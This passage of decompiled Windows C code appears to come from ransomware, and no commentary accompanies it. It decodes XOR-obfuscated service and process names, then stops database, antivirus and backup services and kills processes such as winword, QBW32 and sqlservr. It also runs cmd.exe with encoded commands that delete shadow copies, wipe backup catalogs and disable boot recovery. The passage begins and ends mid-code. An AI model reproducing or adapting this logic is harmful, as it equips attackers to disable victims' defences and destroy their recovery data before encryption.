BYREF\n  __int128 v233; // [esp+4BCh] [ebp-734h] BYREF\n  int v234; // [esp+4CCh] [ebp-724h]\n  __int16 v235; // [esp+4D0h] [ebp-720h]\n  char v236; // [esp+4D2h] [ebp-71Eh]\n  __int128 v237; // [esp+4D3h] [ebp-71Dh] BYREF\n  int v238; // [esp+4E3h] [ebp-70Dh]\n  char v239[3]; // [esp+4E7h] [ebp-709h] BYREF\n  __int128 v240; // [esp+4EAh] [ebp-706h] BYREF\n  char v241[23]; // [esp+4FAh] [ebp-6F6h] BYREF\n  char v242[23]; // [esp+501h] [ebp-6EFh] BYREF\n  __int128 v243; // [esp+518h] [ebp-6D8h] BYREF\n  int v244; // [esp+528h] [ebp-6C8h]\n  __int128 v245; // [esp+52Ch] [ebp-6C4h] BYREF\n  int v246; // [esp+53Ch] [ebp-6B4h]\n  __int16 v247; // [esp+540h] [ebp-6B0h]\n  __int128 v248; // [esp+542h] [ebp-6AEh] BYREF\n  int v249; // [esp+552h] [ebp-69Eh]\n  __int16 v250; // [esp+556h] [ebp-69Ah]\n  __int128 v251; // [esp+558h] [ebp-698h] BYREF\n  int v252; // [esp+568h] [ebp-688h]\n  __int16 v253; // [esp+56Ch] [ebp-684h]\n  __int128 v254; // [esp+56Eh] [ebp-682h] BYREF\n  char v255[5]; // [esp+57Eh] [ebp-672h] BYREF\n  __int128 v256; // [esp+583h] [ebp-66Dh] BYREF\n  int v257; // [esp+593h] [ebp-65Dh]\n  char v258; // [esp+597h] [ebp-659h]\n  LPCSTR lpServiceName; // [esp+598h] [ebp-658h]\n  char *v260; // [esp+59Ch] [ebp-654h]\n  char *v261; // [esp+5A0h] [ebp-650h]\n  char *v262; // [esp+5A4h] [ebp-64Ch]\n  char *v263; // [esp+5A8h] [ebp-648h]\n  char *v264; // [esp+5ACh] [ebp-644h]\n  char *v265; // [esp+5B0h] [ebp-640h]\n  char *v266; // [esp+5B4h] [ebp-63Ch]\n  char *v267; // [esp+5B8h] [ebp-638h]\n  char *v268; // [esp+5BCh] [ebp-634h]\n  char *v269; // [esp+5C0h] [ebp-630h]\n  char *v270; // [esp+5C4h] [ebp-62Ch]\n  char *v271; // [esp+5C8h] [ebp-628h]\n  int v272; // [esp+5CCh] [ebp-624h]\n  char *v273; // [esp+5D0h] [ebp-620h]\n  char *v274; // [esp+5D4h] [ebp-61Ch]\n  char *v275; // [esp+5D8h] [ebp-618h]\n  char *v276; // [esp+5DCh] [ebp-614h]\n  char *v277; // [esp+5E0h] [ebp-610h]\n  char *v278; // [esp+5E4h] [ebp-60Ch]\n  char *v279; // [esp+5E8h] [ebp-608h]\n  char *v280; // [esp+5ECh] [ebp-604h]\n  char *v281; // [esp+5F0h] [ebp-600h]\n  char *v282; // [esp+5F4h] [ebp-5FCh]\n  char *v283; // [esp+5F8h] [ebp-5F8h]\n  char *v284; // [esp+5FCh] [ebp-5F4h]\n  char *v285; // [esp+600h] [ebp-5F0h]\n  char *v286; // [esp+604h] [ebp-5ECh]\n  char *v287; // [esp+608h] [ebp-5E8h]\n  char *v288; // [esp+60Ch] [ebp-5E4h]\n  char *v289; // [esp+610h] [ebp-5E0h]\n  int v290; // [esp+614h] [ebp-5DCh]\n  char *v291; // [esp+618h] [ebp-5D8h]\n  int v292; // [esp+61Ch] [ebp-5D4h]\n  _BYTE *v293; // [esp+620h] [ebp-5D0h]\n  int v294; // [esp+624h] [ebp-5CCh]\n  char *v295; // [esp+628h] [ebp-5C8h]\n  int v296; // [esp+62Ch] [ebp-5C4h]\n  char *v297; // [esp+630h] [ebp-5C0h]\n  char *v298; // [esp+634h] [ebp-5BCh]\n  int v299; // [esp+638h] [ebp-5B8h]\n  int v300; // [esp+63Ch] [ebp-5B4h]\n  char *v301; // [esp+640h] [ebp-5B0h]\n  char *v302; // [esp+644h] [ebp-5ACh]\n  int v303; // [esp+648h] [ebp-5A8h]\n  int v304; // [esp+64Ch] [ebp-5A4h]\n  char *v305; // [esp+650h] [ebp-5A0h]\n  _BYTE *v306; // [esp+654h] [ebp-59Ch]\n  _BYTE *v307; // [esp+658h] [ebp-598h]\n  int v308; // [esp+65Ch] [ebp-594h]\n  CHAR v309[16]; // [esp+664h] [ebp-58Ch] BYREF\n  int v310; // [esp+674h] [ebp-57Ch]\n  char v311[20]; // [esp+678h] [ebp-578h] BYREF\n  CHAR v312[16]; // [esp+68Ch] [ebp-564h] BYREF\n  int v313; // [esp+69Ch] [ebp-554h]\n  void *v314; // [esp+6A0h] [ebp-550h]\n  void *v315; // [esp+6A4h] [ebp-54Ch]\n  void *v316; // [esp+6A8h] [ebp-548h]\n  char v317[20]; // [esp+6AEh] [ebp-542h] BYREF\n  char v318[20]; // [esp+6C2h] [ebp-52Eh] BYREF\n  __int128 v319; // [esp+6D6h] [ebp-51Ah] BYREF\n  char v320[3]; // [esp+6E6h] [ebp-50Ah] BYREF\n  _OWORD v321[2]; // [esp+6E9h] [ebp-507h] BYREF\n  int v322; // [esp+709h] [ebp-4E7h]\n  int v323; // [esp+70Dh] [ebp-4E3h]\n  int v324; // [esp+711h] [ebp-4DFh]\n  __int16 v325; // [esp+715h] [ebp-4DBh]\n  __int128 v326; // [esp+717h] [ebp-4D9h] BYREF\n  __int16 v327; // [esp+727h] [ebp-4C9h]\n  __int128 v328; // [esp+729h] [ebp-4C7h] BYREF\n  __int16 v329; // [esp+739h] [ebp-4B7h]\n  char v330[18]; // [esp+73Bh] [ebp-4B5h] BYREF\n  __int128 v331; // [esp+74Dh] [ebp-4A3h] BYREF\n  char v332; // [esp+75Dh] [ebp-493h]\n  __int128 v333; // [esp+75Eh] [ebp-492h] BYREF\n  __int128 v334; // [esp+76Eh] [ebp-482h] BYREF\n  _OWORD v335[2]; // [esp+77Eh] [ebp-472h] BYREF\n  int v336; // [esp+79Eh] [ebp-452h]\n  int v337; // [esp+7A2h] [ebp-44Eh]\n  _OWORD v338[3]; // [esp+7A6h] [ebp-44Ah] BYREF\n  char v339[18]; // [esp+7D6h] [ebp-41Ah] BYREF\n  int v340; // [esp+7E8h] [ebp-408h]\n  DWORD dwMilliseconds; // [esp+7FCh] [ebp-3F4h]\n  void *Src[10]; // [esp+808h] [ebp-3E8h]\n  struct _PROCESS_INFORMATION ProcessInformation_4; // [esp+830h] [ebp-3C0h] BYREF\n  CHAR ProcName[16]; // [esp+84Ch] [ebp-3A4h] BYREF\n  __int128 v345; // [esp+85Ch] [ebp-394h]\n  SHELLEXECUTEINFOA pExecInfo; // [esp+86Ch] [ebp-384h] BYREF\n  struct _STARTUPINFOA StartupInfo; // [esp+8A8h] [ebp-348h] BYREF\n  __int128 v348; // [esp+8F7h] [ebp-2F9h] BYREF\n  __int128 v349[3]; // [esp+907h] [ebp-2E9h] BYREF\n  __int128 v350[3]; // [esp+937h] [ebp-2B9h] BYREF\n  __int128 v351[3]; // [esp+967h] [ebp-289h] BYREF\n  char v352[337]; // [esp+997h] [ebp-259h] BYREF\n  CHAR CommandLine[264]; // [esp+AE8h] [ebp-108h] BYREF\n\n  sub_40A220();\n  v141[8] = 2;\n  strcpy(v142, \"wrapper\");\n  strcpy(v145, \"|DefWatch\");\n  strcpy(v146, \"WccEvtMgr\");\n  strcpy(v152, \"PccSetMgr\");\n  strcpy(&v140[9], \"dSavRoam\");\n  strcpy(&v135[9], \"SSqlservr\");\n  strcpy(v148, \",sqlagent\");\n  strcpy(v149, \"]sqladhlp\");\n  strcpy(v160, \"&Culserver\");\n  strcpy(v134, \"!RTVscan\");\n  strcpy(v155, \"Tsqlbrowser\");\n  v149[10] = 11;\n  strcpy(v150, \"SQLADHLP\");\n  v1 = 7;\n  v2 = 0;\n  strcpy(v168, \"\\aVENCWTbuqndb\");\n  while ( 1 )\n  {\n    v168[v2 + 1] ^= v1;\n    if ( (unsigned int)++v2 >= 0xC )\n      break;\n    v1 = v168[0];\n  }\n  v3 = 0;\n  v168[13] = 0;\n  v227 = xmmword_4191B0;\n  v228 = 995298838;\n  strcpy(v229, \">.\");\n  do\n    *((_BYTE *)&v227 + ++v3) ^= v227;\n  while ( v3 < 0x15 );\n  v4 = 0;\n  v229[2] = 0;\n  v243 = xmmword_419220;\n  v244 = 262664;\n  do\n    *((_BYTE *)&v243 + ++v4) ^= v243;\n  while ( v4 < 0x12 );\n  v142[8] = 12;\n  strcpy(v143, \"sqlwriter\");\n  strcpy(v140, \"vmsmdsrv\");\n  strcpy(&v134[9], \"Ktomcat6\");\n  HIBYTE(v244) = 0;\n  v5 = 75;\n  v6 = 0;\n  strcpy(v184, \"K1#>/$%,-*%,2>\");\n  while ( 1 )\n  {\n    v184[v6 + 1] ^= v5;\n    if ( (unsigned int)++v6 >= 0xD )\n      break;\n    v5 = v184[0];\n  }\n  v7 = 0;\n  v184[14] = 0;\n  strcpy(v242, \"^(3)?,;s+-<?,<7*?*1,hj\");\n  do\n    v242[++v7] ^= v242[0];\n  while ( v7 < 0x15 );\n  v8 = 0;\n  v242[22] = 0;\n  strcpy(v330, \"^(3)?,;s=10(;,*;,\");\n  do\n    v330[++v8] ^= v330[0];\n  while ( v8 < 0x10 );\n  v138[8] = 23;\n  strcpy(v139, \"dbsrv12\");\n  strcpy(&v143[10], \"Vdbeng8\");\n  v330[17] = 0;\n  v9 = 0;\n  v251 = xmmword_419870;\n  v252 = 1953111582;\n  v253 = 121;\n  do\n    *((_BYTE *)&v251 + ++v9) ^= v251;\n  while ( v9 < 0x14 );\n  v10 = 0;\n  HIBYTE(v253) = 0;\n  strcpy(v311, \"}0..,1Y+88<0.,1OMLO\");\n  do\n    v311[++v10] ^= v311[0];\n  while ( v10 < 0x12 );\n  v11 = 0;\n  v311[19] = 0;\n  v240 = xmmword_419360;\n  strcpy(v241, \"$9GEDG\");\n  do\n    v241[v11++ - 15] ^= v240;\n  while ( v11 < 0x15 );\n  strcpy(v166, \"eSQLBrowser\");\n  strcpy(v161, \"_SQLWriter\");\n  v12 = 21;\n  v241[6] = 0;\n  v13 = 0;\n  v185 = 1719423765;\n  strcpy(v186, \"}wzbyXlFDY\");\n  while ( 1 )\n  {\n    v186[v13++ - 3] ^= v12;\n    if ( v13 >= 0xD )\n      break;\n    v12 = v185;\n  }\n  v14 = 0;\n  v186[10] = 0;\n  v245 = xmmword_4198B0;\n  v246 = 1986534428;\n  v247 = 123;\n  do\n    *((_BYTE *)&v245 + ++v14) ^= v245;\n  while ( v14 < 0x14 );\n  v140[18] = 8;\n  strcpy(v141, \"MySQL57\");\n  HIBYTE(v247) = 0;\n  v15 = 0;\n  v224 = xmmword_419950;\n  v225 = 1836874623;\n  v226 = 6716281;\n  do\n    *((_BYTE *)&v224 + ++v15) ^= v224;\n  while ( v15 < 0x16 );\n  v16 = 0;\n  HIBYTE(v226) = 0;\n  strcpy(v223, \"\\nGYY[FYox|oxKNBofzox;::\");\n  do\n    v223[++v16] ^= v223[0];\n  while ( v16 < 0x16 );\n  v17 = 0;\n  v223[23] = 0;\n  v214 = xmmword_419410;\n  strcpy(v215, \"5+.'#$5!#>\");\n  do\n    v215[v17++ - 15] ^= v214;\n  while ( v17 < 0x19 );\n  v18 = 0;\n  v215[10] = 0;\n  v319 = xmmword_419980;\n  strcpy(v320, \"sq\");\n  do\n    v320[v18++ - 15] ^= v319;\n  while ( v18 < 0x11 );\n  v19 = 0;\n  v320[2] = 0;\n  v237 = xmmword_4199A0;\n  v238 = 2088504332;\n  strcpy(v239, \"jj\");\n  do\n    *((_BYTE *)&v237 + ++v19) ^= v237;\n  while ( v19 < 0x15 );\n  v20 = 0;\n  v239[2] = 0;\n  v256 = xmmword_4191F0;\n  v257 = 504827915;\n  v258 = 0;\n  do\n    *((_BYTE *)&v256 + ++v20) ^= v256;\n  while ( v20 < 0x13 );\n  v21 = 0;\n  v258 = 0;\n  v328 = xmmword_419660;\n  v329 = 78;\n  do\n    *((_BYTE *)&v328 + ++v21) ^= v328;\n  while ( v21 < 0x10 );\n  v22 = 0;\n  HIBYTE(v329) = 0;\n  v202 = xmmword_419450;\n  v203 = 521019240;\n  v204 = 84017921;\n  v205 = 85852952;\n  v206 = 2818;\n  v207 = 0;\n  do\n    *((_BYTE *)&v202 + ++v22) ^= v202;\n  while ( v22 < 0x1D );\n  v23 = 0;\n  v207 = 0;\n  v210 = xmmword_4193E0;\n  v211 = 403769981;\n  v212 = 369695755;\n  v213 = 857872;\n  do\n    *((_BYTE *)&v210 + ++v23) ^= v210;\n  while ( v23 < 0x1A );\n  v24 = 0;\n  HIBYTE(v213) = 0;\n  v220 = xmmword_419110;\n  v221 = 286005002;\n  v222 = 265482;\n  do\n    *((_BYTE *)&v220 + ++v24) ^= v220;\n  while ( v24 < 0x16 );\n  v25 = 0;\n  HIBYTE(v222) = 0;\n  v254 = xmmword_419970;\n  strcpy(v255, \"ecd~\");\n  do\n    v255[v25++ - 15] ^= v254;\n  while ( v25 < 0x13 );\n  v255[4] = 0;\n  v26 = 111;\n  v170[0] = 690830959;\n  v27 = 0;\n  v170[1] = 487210028;\n  v170[2] = 168560153;\n  v171 = 0;\n  while ( 1 )\n  {\n    *((_BYTE *)v170 + ++v27) ^= v26;\n    if ( v27 >= 0xB )\n      break;\n    v26 = v170[0];\n  }\n  v171 = 0;\n  strcpy(v177, \"RQBVSS\");\n  hSCManager = OpenSCManagerA(0, 0, 0xF003Fu);\n  if ( !hSCManager && GetLastError() == 5 )\n    goto LABEL_88;\n  lpServiceName = v142;\n  v260 = &v145[1];\n  v261 = &v146[1];\n  v262 = &v152[1];\n  v263 = &v140[10];\n  v264 = &v135[10];\n  v265 = &v148[1];\n  v266 = &v149[1];\n  v267 = &v160[1];\n  v268 = &v134[1];\n  v269 = &v155[1];\n  v270 = v150;\n  v271 = &v168[1];\n  v272 = (int)&v227 + 1;\n  v273 = (char *)&v243 + 1;\n  v274 = v143;\n  v275 = &v140[1];\n  v276 = &v134[10];\n  v277 = &v184[1];\n  v278 = &v242[1];\n  v279 = &v330[1];\n  v280 = v139;\n  v281 = &v143[11];\n  v282 = (char *)&v251 + 1;\n  v283 = &v311[1];\n  v284 = (char *)&v240 + 1;\n  v285 = &v166[1];\n  v286 = &v161[1];\n  v287 = (char *)&v185 + 1;\n  v288 = (char *)&v245 + 1;\n  v289 = v141;\n  v290 = (int)&v224 + 1;\n  v291 = &v223[1];\n  v292 = (int)&v214 + 1;\n  v293 = (char *)&v319 + 1;\n  v294 = (int)&v237 + 1;\n  v295 = (char *)&v256 + 1;\n  v296 = (int)&v328 + 1;\n  v297 = (char *)&v202 + 1;\n  v298 = (char *)&v210 + 1;\n  v299 = (int)&v220 + 1;\n  v300 = (int)&v254 + 1;\n  v301 = (char *)v170 + 1;\n  v303 = 0;\n  v28 = 0;\n  v302 = &v177[1];\n  do\n  {\n    hSnapshot = (HANDLE)GetTickCount();\n    v29 = OpenServiceA(hSCManager, (&lpServiceName)[v28], 0x2Cu);\n    if ( !v29 )\n      goto LABEL_85;\n    if ( !QueryServiceStatusEx(v29, SC_STATUS_PROCESS_INFO, (LPBYTE)&v339[14], 0x24u, &pcbBytesNeeded) )\n    {\nLABEL_56:\n      v94 = v29;\n      v30 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;\n      CloseServiceHandle(v94);\n      goto LABEL_86;\n    }\n    if ( v340 == 1 )\n    {\n      v31 = 0;\n      *(_OWORD *)v312 = xmmword_419310;\n      v313 = 658206;\n      do\n        v312[++v31] ^= v312[0];\n      while ( v31 < 0x12 );\n      v95 = (&lpServiceName)[v28];\n      HIBYTE(v313) = 0;\n      sub_4100C0(&v312[1], v95);\n      v96 = v29;\n      v30 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;\n      CloseServiceHandle(v96);\n      goto LABEL_86;\n    }\n    if ( v340 == 3 )\n    {\n      while ( 1 )\n      {\n        v32 = dwMilliseconds / 0xA;\n        if ( dwMilliseconds / 0xA >= 0x3E8 )\n        {\n          if ( v32 > 0x2710 )\n            v32 = 10000;\n        }\n        else\n        {\n          v32 = 1000;\n        }\n        Sleep(v32);\n        if ( !QueryServiceStatusEx(v29, SC_STATUS_PROCESS_INFO, (LPBYTE)&v339[14], 0x24u, &pcbBytesNeeded) )\n          goto LABEL_72;\n        if ( v340 == 1 )\n          break;\n        if ( GetTickCount() - (unsigned int)hSnapshot > 0x7530 )\n          goto LABEL_72;\nLABEL_73:\n        if ( v340 != 3 )\n          goto LABEL_74;\n      }\n      v33 = 0;\n      *(_OWORD *)v309 = xmmword_4198C0;\n      v310 = 8026990;\n      do\n        v309[++v33] ^= v309[0];\n      while ( v33 < 0x12 );\n      v97 = (&lpServiceName)[v28];\n      HIBYTE(v310) = 0;\n      sub_4100C0(&v309[1], v97);\nLABEL_72:\n      ++v28;\n      CloseServiceHandle(v29);\n      goto LABEL_73;\n    }\nLABEL_74:\n    sub_40F310(v29, hSCManager);\n    if ( !ControlService(v29, 1u, (LPSERVICE_STATUS)&v339[14]) )\n      goto LABEL_56;\n    if ( v340 == 1 )\n      goto LABEL_85;\n    while ( 1 )\n    {\n      Sleep(dwMilliseconds);\n      if ( !QueryServiceStatusEx(v29, SC_STATUS_PROCESS_INFO, (LPBYTE)&v339[14], 0x24u, &pcbBytesNeeded) )\n      {\nLABEL_79:\n        ++v28;\n        CloseServiceHandle(v29);\n        goto LABEL_80;\n      }\n      if ( v340 == 1 )\n        break;\n      if ( GetTickCount() - (unsigned int)hSnapshot > 0x7530 )\n        goto LABEL_79;\nLABEL_80:\n      if ( v340 == 1 )\n        goto LABEL_85;\n    }\n    v34 = 0;\n    strcpy(v318, \"[\\b>)-28>{~({(/4++>?\");\n    do\n      v318[++v34] ^= v318[0];\n    while ( v34 < 0x12 );\n    v98 = (&lpServiceName)[v28];\n    v318[19] = 0;\n    sub_4100C0(&v318[1], v98);\nLABEL_85:\n    v30 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;\nLABEL_86:\n    ++v28;\n  }\n  while ( (&lpServiceName)[v28] );\n  v30(hSCManager);\nLABEL_88:\n  CoInitializeEx(0, 6u);\n  v348 = xmmword_419880;\n  strcpy(v135, \"8cmd.exe\");\n  qmemcpy(v349, \"crc&ungbiqu&)gjj&)wsocr& &qkoe&u\", 32);\n  v349[2] = xmmword_4197C0;\n  qmemcpy(v350, \"& &debcbor&)ucr&}bc`gsjr{&diirur\", 32);\n  v350[2] = xmmword_419920;\n  qmemcpy(v351, \"cgjj`gojstcu& &debcbor&)ucr&}bc`\", 32);\n  v351[2] = xmmword_419840;\n  strcpy(v352, \"gdjcb&hi& &qdgbkoh&bcjcrc&egrgjia&+wsocr\");\n  v35 = 0;\n  strcpy(v176, \"Rrunas\");\n  do\n    *((_BYTE *)&v348 + ++v35) ^= v348;\n  while ( v35 < 0xC7 );\n  v352[40] = 0;\n  memset(&v352[45], 0, 0x124u);\n  *(_DWORD *)&v352[41] = 296;\n  hSnapshota = CreateToolhelp32Snapshot(2u, 0);\n  Process32First(hSnapshota, (LPPROCESSENTRY32)&v352[41]);\n  v166[12] = 29;\n  strcpy(v167, \"wxServer\");\n  v36 = 85;\n  v37 = 0;\n  v179[0] = 103621205;\n  v179[1] = 807610160;\n  v179[2] = 809239335;\n  v180 = 34;\n  while ( 1 )\n  {\n    *((_BYTE *)v179 + ++v37) ^= v36;\n    if ( v37 >= 0xC )\n      break;\n    v36 = v179[0];\n  }\n  v167[9] = 23;\n  strcpy(&v167[10], \"sqlmangr\");\n  strcpy(v159, \"6supervise\");\n  strcpy(v175, \"DRAgui\");\n  HIBYTE(v180) = 0;\n  v137[8] = 18;\n  strcpy(&v150[9], \"jDefwatch\");\n  strcpy(v138, \"Culture\");\n  v136[18] = 30;\n  strcpy(v137, \"winword\");\n  strcpy(v136, \"GQBDBMgr\");\n  strcpy(v174, \"|QBW32\");\n  v150[19] = 22;\n  strcpy(v151, \"qbupdate\");\n  strcpy(v158, \"$axlbridge\");\n  strcpy(v164, \"Cfdlauncher\");\n  strcpy(v163, \"dhttpd\");\n  strcpy(&v151[9], \"_MsDtSrvr\");\n  strcpy(v169, \"fjava\");\n  strcpy(v178, \"4360se\");\n  strcpy(v157, \"]360doctor\");\n  strcpy(&v156[10], \"|wdswfsafe\");\n  v143[18] = 5;\n  strcpy(v144, \"fdhost\");\n  v146[10] = 1;\n  strcpy(v147, \"GDscan\");\n  strcpy(v183, \"0jXEt_^WvQ^WiE\");\n  v38 = 48;\n  v39 = 0;\n  while ( 1 )\n  {\n    v183[v39 + 1] ^= v38;\n    if ( (unsigned int)++v39 >= 0xD )\n      break;\n    v38 = v183[0];\n  }\n  strcpy(v156, \"oQBDBMgrN\");\n  strcpy(&v154[10], \"nmysqld\");\n  v183[14] = 0;\n  v40 = 0;\n  strcpy(v317, \"/nZ[@KJ\\\\DkJ\\\\D[@_n__\");\n  do\n    v317[++v40] ^= v317[0];\n  while ( v40 < 0x12 );\n  v317[19] = 0;\n  v41 = 101;\n  v181[0] = 302384229;\n  v42 = 0;\n  v181[1] = 386336512;\n  v181[2] = 1446410;\n  v182 = 23;\n  while ( 1 )\n  {\n    *((_BYTE *)v181 + ++v42) ^= v41;\n    if ( v42 >= 0xC )\n      break;\n    v41 = v181[0];\n  }\n  v43 = 0;\n  HIBYTE(v182) = 0;\n  v334 = xmmword_418FD0;\n  do\n    *((_BYTE *)&v334 + ++v43) ^= v334;\n  while ( v43 < 0xE );\n  v44 = 0;\n  HIBYTE(v334) = 0;\n  v233 = xmmword_419350;\n  v234 = 520094739;\n  v235 = 4885;\n  v236 = 0;\n  do\n    *((_BYTE *)&v233 + ++v44) ^= v233;\n  while ( v44 < 0x15 );\n  v152[10] = 17;\n  strcpy(&v152[11], \"CoreSync\");\n  v45 = 0;\n  v236 = 0;\n  v326 = xmmword_419500;\n  v327 = 93;\n  do\n    *((_BYTE *)&v326 + ++v45) ^= v326;\n  while ( v45 < 0x10 );\n  strcpy(&v168[14], \"@node\");\n  HIBYTE(v327) = 0;\n  v46 = 0;\n  v333 = xmmword_419000;\n  do\n    *((_BYTE *)&v333 + ++v46) ^= v333;\n  while ( v46 < 0xE );\n  HIBYTE(v333) = 0;\n  v47 = 79;\n  strcpy(v173, \"O<6!,b;.<$-.=\");\n  v48 = 0;\n  while ( 1 )\n  {\n    v173[v48 + 1] ^= v47;\n    if ( (unsigned int)++v48 >= 0xC )\n      break;\n    v47 = v173[0];\n  }\n  v173[13] = 0;\n  v49 = 69;\n  strcpy(v172, \"E6<+&h2*7. 7\");\n  v50 = 0;\n  while ( 1 )\n  {\n    v172[v50 + 1] ^= v49;\n    if ( (unsigned int)++v50 >= 0xB )\n      break;\n    v49 = v172[0];\n  }\n  v51 = 0;\n  v172[12] = 0;\n  v248 = xmmword_419100;\n  v249 = 421462551;\n  v250 = 24;\n  do\n    *((_BYTE *)&v248 + ++v51) ^= v248;\n  while ( v51 < 0x14 );\n  v52 = 0;\n  HIBYTE(v250) = 0;\n  v331 = xmmword_419240;\n  v332 = 0;\n  do\n    *((_BYTE *)&v331 + ++v52) ^= v331;\n  while ( v52 < 0xF );\n  strcpy(v165, \"NBrCtrlCntr\");\n  strcpy(v162, \"@BrCcUxSys\");\n  v332 = 0;\n  v53 = 0;\n  v216 = xmmword_4191E0;\n  v217 = 354039317;\n  v218 = 152968218;\n  v219 = 0;\n  do\n    *((_BYTE *)&v216 + ++v53) ^= v216;\n  while ( v53 < 0x17 );\n  v54 = 0;\n  v219 = 0;\n  v230 = xmmword_419910;\n  v231 = 1699708775;\n  strcpy(v232, \"ih\");\n  do\n    *((_BYTE *)&v230 + ++v54) ^= v230;\n  while ( v54 < 0x15 );\n  strcpy(&v136[9], \"Kfbguard\");\n  strcpy(v153, \"Wfbserver\");\n  v153[10] = 22;\n  strcpy(&v153[11], \"ONENOTEM\");\n  v232[2] = 0;\n  lpServiceName = v167;\n  v260 = (char *)v179 + 1;\n  v261 = &v135[10];\n  v262 = &v175[1];\n  v263 = &v159[1];\n  v264 = v138;\n  v265 = &v134[1];\n  v266 = &v150[10];\n  v267 = &v155[1];\n  v268 = v137;\n  v269 = &v174[1];\n  v270 = &v136[1];\n  v271 = v151;\n  v272 = (int)&v243 + 1;\n  v273 = &v158[1];\n  v274 = &v168[1];\n  v275 = &v163[1];\n  v276 = &v164[1];\n  v277 = &v151[10];\n  v278 = &v134[10];\n  v279 = &v169[1];\n  v280 = &v178[1];\n  v281 = &v157[1];\n  v282 = &v156[11];\n  v283 = v144;\n  v284 = v147;\n  v285 = &v183[1];\n  v286 = &v156[1];\n  v287 = v143;\n  v288 = &v154[11];\n  v289 = &v317[1];\n  v290 = (int)v181 + 1;\n  v291 = (char *)&v334 + 1;\n  v292 = (int)&v233 + 1;\n  v293 = &v152[11];\n  v294 = (int)&v326 + 1;\n  v295 = &v168[15];\n  v296 = (int)&v333 + 1;\n  v297 = &v173[1];\n  v298 = &v172[1];\n  v299 = (int)&v248 + 1;\n  v300 = (int)&v331 + 1;\n  v301 = &v165[1];\n  v302 = &v162[1];\n  v303 = (int)&v216 + 1;\n  v304 = (int)&v230 + 1;\n  v305 = &v136[10];\n  v306 = &v153[1];\n  v307 = &v153[11];\n  v308 = 0;\n  do\n  {\n    PathRemoveExtensionA(&v352[77]);\n    v55 = 0;\n    do\n    {\n      v56 = v55;\n      v57 = lstrcmpiA(&v352[77], (&lpServiceName)[v55]);\n      if ( !v57 )\n      {\n        *(_OWORD *)v208 = xmmword_419430;\n        strcpy(v209, \"!$r!Zqhe;!$me\\\\\");\n        do\n          v208[++v57] ^= v208[0];\n        while ( v57 < 0x1D );\n        v209[14] = 0;\n        sub_4100C0(&v208[1], &v352[77], *(_DWORD *)&v352[49]);\n        sub_40F270(*(void **)&v352[49]);\n      }\n      ++v55;\n    }\n    while ( (&v260)[v56] );\n  }\n  while ( Process32Next(hSnapshota, (LPPROCESSENTRY32)&v352[41]) );\n  CloseHandle(hSnapshota);\n  v200 = 0;\n  if ( sub_40F8C0() )\n  {\n    v58 = 0;\n    *(_OWORD *)ProcName = xmmword_419460;\n    v345 = xmmword_418F80;\n    do\n      ProcName[++v58] ^= ProcName[0];\n    while ( v58 < 0x1E );\n    strcpy(v154, \"Akernel32\");\n    HIBYTE(v345) = 0;\n    ModuleHandleA = GetModuleHandleA(&v154[1]);\n    ProcAddress = GetProcAddress(ModuleHandleA, &ProcName[1]);\n    if ( ProcAddress )\n      ((void (__stdcall *)(int *))ProcAddress)(&v200);\n  }\n  pExecInfo.cbSize = 60;\n  pExecInfo.lpVerb = &v176[1];\n  pExecInfo.lpFile = &v135[1];\n  pExecInfo.lpParameters = (char *)&v348 + 1;\n  pExecInfo.fMask = 0;\n  pExecInfo.hwnd = 0;\n  memset(&pExecInfo.lpDirectory, 0, 12);\n  ShellExecuteExA(&pExecInfo);\n  Sleep(0x3E8u);\n  v61 = 0;\n  v335[0] = xmmword_419810;\n  v336 = 2119836715;\n  v335[1] = xmmword_419800;\n  v337 = 8351330;\n  do\n    *((_BYTE *)v335 + ++v61) ^= LOBYTE(v335[0]);\n  while ( v61 < 0x26 );\n  v62 = 0;\n  v321[0] = xmmword_4190C0;\n  HIBYTE(v337) = 0;\n  v321[1] = xmmword_419050;\n  v322 = 453446683;\n  v323 = 303832848;\n  v324 = 811473435;\n  v325 = 17;\n  do\n    *((_BYTE *)v321 + ++v62) ^= LOBYTE(v321[0]);\n  while ( v62 < 0x2C );\n  v63 = 0;\n  v338[0] = xmmword_419690;\n  HIBYTE(v325) = 0;\n  v338[1] = xmmword_419780;\n  strcpy(v339, \"^IM@@JME@Y^I_\");\n  v338[2] = xmmword_419490;\n  do\n    *((_BYTE *)v338 + ++v63) ^= LOBYTE(v338[0]);\n  while ( v63 < 0x3C );\n  v339[13] = 0;\n  v188 = xmmword_419960;\n  v189 = 1611888231;\n  qmemcpy(v190, \"j`gv~`g\", sizeof(v190));\n  v191 = sub_401020(&v188, 65);\n  v192 = sub_401020(&v188, 84);\n  v193 = sub_401020(&v188, 69);\n  v194 = sub_401020(&v188, 66);\n  v195 = sub_401020(&v188, 65);\n  v196 = sub_401020(&v188, 67);\n  v197 = sub_401020(&v188, 75);\n  v198 = sub_401020(&v188, 85);\n  v64 = 0;\n  v199 = (unsigned __int8)sub_401020(&v188, 80);\n  hSnapshotb = 0;\n  do\n  {\n    hSCManagerb = *sub_401010((char *)&v188 + 1, v64);\n    v65 = sub_401010((char *)&v188 + 1, v64);\n    *v65 = sub_401020(&v188, hSCManagerb);\n    v64 = (unsigned int)hSnapshotb + 1;\n    hSnapshotb = (HANDLE)v64;\n  }\n  while ( v64 < 0x23 );\n  *sub_401010((char *)&v188 + 1, 35) = 0;\n  v316 = sub_401000((char *)&v188 + 1);\n  v130 = 115;\n  v131[0] = sub_401020(&v130, 47);\n  v131[1] = sub_401020(&v130, 99);\n  v131[2] = sub_401020(&v130, 32);\n  v131[3] = sub_401020(&v130, 119);\n  v131[4] = sub_401020(&v130, 98);\n  v131[5] = sub_401020(&v130, 97);\n  v131[6] = sub_401020(&v130, 100);\n  v131[7] = sub_401020(&v130, 109);\n  v131[8] = sub_401020(&v130, 105);\n  v131[9] = sub_401020(&v130, 110);\n  v131[10] = sub_401020(&v130, 32);\n  v131[11] = sub_401020(&v130, 68);\n  v131[12] = sub_401020(&v130, 69);\n  v131[13] = sub_401020(&v130, 76);\n  v131[14] = sub_401020(&v130, 69);\n  v131[15] = sub_401020(&v130, 84);\n  v131[16] = sub_401020(&v130, 69);\n  v131[17] = sub_401020(&v130, 32);\n  v131[18] = sub_401020(&v130, 83);\n  v131[19] = sub_401020(&v130, 89);\n  v131[20] = sub_401020(&v130, 83);\n  v131[21] = sub_401020(&v130, 84);\n  v131[22] = sub_401020(&v130, 69);\n  v131[23] = sub_401020(&v130, 77);\n  v131[24] = 